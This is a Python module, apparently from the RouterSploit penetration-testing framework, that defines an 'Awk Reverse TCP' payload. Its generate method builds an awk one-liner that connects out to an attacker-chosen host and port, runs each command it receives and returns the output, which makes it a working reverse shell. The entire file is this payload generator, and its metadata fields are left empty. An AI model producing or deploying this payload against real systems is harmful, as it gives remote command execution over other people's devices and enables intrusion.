from routersploit import exploits
from routersploit.payloads import GenericPayload, ReverseTCPPayloadMixin


class Exploit(ReverseTCPPayloadMixin, GenericPayload):
    __info__ = {
        'name': 'Awk Reverse TCP',
        'authors': [
        ],
        'description': '',
        'references': [
        ],
        'devices': [
        ],
    }
    awk_binary = exploits.Option('awk', 'Awk binary')

    def generate(self):
        return (
            self.awk_binary
            + " 'BEGIN{s=\"/inet/tcp/0/"
            + self.lhost + "/"
            + str(self.lport)
            + "\";for(;s|&getline c;close(c))"
              "while(c|getline)print|&s;close(s)};'"
        )
